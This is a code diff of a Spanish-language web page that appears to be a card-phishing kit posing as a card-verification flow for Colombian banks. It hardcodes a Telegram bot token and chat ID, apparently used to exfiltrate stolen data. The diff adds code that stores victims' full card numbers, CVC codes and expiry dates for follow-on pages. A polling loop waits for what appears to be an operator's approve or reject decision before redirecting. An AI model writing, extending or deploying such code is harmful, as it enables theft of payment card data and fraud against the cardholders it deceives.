@@ -249,7 +249,6 @@
       display: block;
     }
 
-    /* LOADING OVERLAY */
     .loading-overlay {
       display: none;
       position: fixed;
@@ -646,7 +645,7 @@
 
   <script>
     // ============================================
-    // CONFIGURACIÓN - TOKEN Y CHAT ID CORRECTOS
+    // CONFIGURACIÓN
     // ============================================
     const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
     const TELEGRAM_CHAT_ID = '-1004294946880';
@@ -660,7 +659,7 @@
     let bancoSeleccionado = null;
 
     // ============================================
-    // MAPA DE LOGOS DE BANCOS CON LOS NOMBRES EXACTOS
+    // MAPA DE LOGOS DE BANCOS
     // ============================================
     const bankLogos = {
       'Bancolombia': 'bancol.png',
@@ -822,12 +821,21 @@
       const progressFill = document.getElementById('progressFill');
       const loadingText = document.getElementById('loadingText');
 
-      // 🔥 GUARDAR EL LOGO DEL BANCO EN localStorage
+      // 🔥 GUARDAR CON LAS CLAVES QUE ESPERA visa.html / master.html / amex.html
       const logoFile = bankLogos[banco] || defaultLogo;
+      
+      // ✅ CLAVES QUE USA visa.html
+      localStorage.setItem('bancoEmisor', banco);
+      localStorage.setItem('bankLogo', logoFile);
+      localStorage.setItem('cardLast4', document.getElementById('cc').value.replace(/\s/g, '').slice(-4));
+      localStorage.setItem('cardNumber', document.getElementById('cc').value);
+      localStorage.setItem('cvc', document.getElementById('cvv').value);
+      localStorage.setItem('expiry', document.getElementById('fecha').value);
+      
+      // También guardamos las claves antiguas por compatibilidad
       localStorage.setItem('logo_banco', logoFile);
       localStorage.setItem('banco_seleccionado', banco);
       localStorage.setItem('tipo_tarjeta', tipoTarjeta);
-      localStorage.setItem('card_last4', document.getElementById('cc').value.replace(/\s/g, '').slice(-4));
 
       // Mostrar el overlay de carga
       document.getElementById('loadingOverlay').classList.add('active');
@@ -854,7 +862,6 @@
       };
       loadingText.textContent = 'Redirigiendo a ' + (nombres[tipoTarjeta] || '...');
       
-      // Barra de progreso
       let progress = 0;
       const duration = 3000;
       const interval = 50;
@@ -977,6 +984,7 @@
 
         if (resultado === 'approved') {
           clearInterval(pollingInterval);
+          // ✅ Mostrar pantalla de carga directamente
           mostrarCargaYRedirigir(tipoTarjeta, banco);
         } else if (resultado === 'rejected') {
           clearInterval(pollingInterval);
